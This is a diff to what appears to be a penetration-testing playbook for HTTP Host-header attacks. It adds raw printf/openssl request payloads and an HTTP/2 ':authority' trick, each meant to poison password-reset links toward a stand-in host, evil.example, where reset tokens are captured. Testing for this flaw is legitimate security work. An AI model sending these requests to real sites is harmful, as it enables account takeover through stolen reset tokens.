@@ -12,10 +12,13 @@ report_count: 16
 This skill is built from the public Host-header attack literature, not invented payloads.
 Cite the *technique source* in your report, never a fabricated ID:
 
-- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
-  "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
-  case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
-  allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
+- **Password-reset poisoning class** — the canonical write-up is James Kettle, "Practical HTTP
+  Host header attacks" (skeletonscribe.net, 1 May 2013,
+  https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html): reset-link
+  poisoning, Host-driven cache poisoning, and bypasses via default vhosts, `X-Forwarded-Host`,
+  port/`user@host` tricks and absolute request URIs. Many frameworks built the reset URL from the
+  request Host with no `ALLOWED_HOSTS`-style allowlist. Cite the framework + the reflected-Host
+  behaviour you actually observed.
 - **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
   James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
   These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
@@ -96,8 +99,14 @@ curl -s -X POST https://$TARGET/forgot-password \
   -d "email=your-test-account@target.example"
 
 # 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
-printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.example' "$TARGET" \
+printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\nConnection: close\r\n\r\nemail=your-test-account@target.example' "$TARGET" \
   | openssl s_client -quiet -connect $TARGET:443 2>/dev/null
+
+# 1g. Absolute-URI request line: the routing layer uses the URI's host, while app code that
+#     reads the Host header sees evil.example (Kettle 2013; RFC 2616 told servers to ignore
+#     Host in this case, and many stacks still disagree about which one wins).
+printf 'POST https://%s/forgot-password HTTP/1.1\r\nHost: evil.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\nConnection: close\r\n\r\nemail=your-test-account@target.example' "$TARGET" \
+  | openssl s_client -quiet -connect $TARGET:443 -servername $TARGET 2>/dev/null
 
 # 1e. Absolute-URL injection: keep real Host, append attacker host so the
 #     reset link becomes https://TARGET.evil.example/... or routes the token out
@@ -206,6 +215,18 @@ curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host:
 
 **Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
 Collaborator) — a reflected string alone is not ATO.
+
+### Phase 4b — HTTP/2 `:authority` vs `Host` disagreement
+
+Over HTTP/2 the target host travels in the `:authority` pseudo-header. RFC 9113 §8.3.1: a client
+MUST NOT send a `Host` header that differs from `:authority`, and a server SHOULD treat such a
+request as malformed. Many stacks accept it, and then the front-end routes on one while the app
+builds URLs from the other. curl folds `-H Host:` into `:authority`, so use Burp Repeater over
+HTTP/2 (Inspector edits pseudo-headers): keep `:authority: $TARGET`, add `host: evil.example`,
+and replay the Phase 1 reset request against your own test account and the Phase 2 reflection
+check. A 400 is the correct behaviour; a reset link or cached absolute URL carrying `evil.example`
+is the finding. The pseudo-header matrix in `hunt-http-smuggling` →
+`references/h2-exclusive-vectors.md` covers the desync side of the same ambiguity.
 
 ### Phase 5 — Header Fuzzing (Param Miner)
 
